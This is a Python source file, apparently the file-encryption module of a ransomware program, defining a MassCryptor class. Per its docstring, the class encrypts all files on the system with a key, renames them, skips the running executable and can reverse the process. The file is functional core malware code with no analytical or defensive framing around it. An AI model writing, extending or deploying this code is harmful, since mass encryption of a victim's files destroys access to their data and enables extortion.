from stub.types import MAX_ENCRYPT_THREADS, Limiter
from stub.file import Filer, CryptFile, File
from stub.types import EncryptionConfig
from stub.utils import except_pass
from typing import List, TypeAlias
from pathlib import Path
import sys
import os

AbsPath: TypeAlias = str


class MassCryptor:
    """
    MassCryptor is a class that encrypts all files on the system with the given key.
    """

    def __init__(self, p_key: bytes, cfg: EncryptionConfig) -> None:
        self.p_key = p_key
        self.cfg = cfg
        self.filer = Filer()
        self.limiter = Limiter(MAX_ENCRYPT_THREADS)

        self._vpath_pure = Path(os.path.abspath(sys.argv[0]))
        self._encrypted: List[File] = []

    @property
    def encrypted(self) -> List[AbsPath]:
        return [f.path for f in self._encrypted] if self._encrypted else []

    def encrypt(self) -> None:
        """Recursively encrypts all files on the system."""
        self.filer.traverse_all(self.crypt)  # Encrypt all files
        self._encrypted = self.filer.files

        for file in self._encrypted:
            self.limiter.add_task(self.posthook, file)

        self.limiter.reset()

    def decrypt(self, files: List[AbsPath] | List[File] | None = None) -> None:
        """
        If `files` is `None`, it will traverse all files on the system recursively.
        If `files` is not `None`, it will decrypt the given files in a linear manner.
        """
        if not files or len(files) <= 0:
            self.filer.traverse_all(self.rev_crypt)  # Reverse encryption
            return

        for file in files:
            self.limiter.add_task(self.rev_crypt, file)

        self.limiter.reset()

    def rev_crypt(self, file: File | AbsPath) -> None:
        _file = file if isinstance(file, File) else File(file)
        assert not (_file.path_obj is None or _file.name is None)

        if _file.path_obj.samefile(self._vpath_pure) or _file.name.startswith(
            "ENCRYPTED_"
        ):
            return

        cryptin = CryptFile(_file, self.p_key, self.cfg)
        cryptin.decrypt()  # Also changes the file name

    def crypt(self, file: File) -> None:
        # Don't encrypt the current running program
        if Path(file.path).samefile(self._vpath_pure):
            return

        if file.name and file.name.startswith(
            "ENCRYPTED_"
        ):  # Don't encrypt already encrypted files
            return

        cryptin = CryptFile(file, self.p_key, self.cfg)
        cryptin.encrypt()

    @except_pass
    def posthook(self, file: File) -> None:
        cryptin = CryptFile(file, self.p_key, self.cfg)
        cryptin.proper_rename()
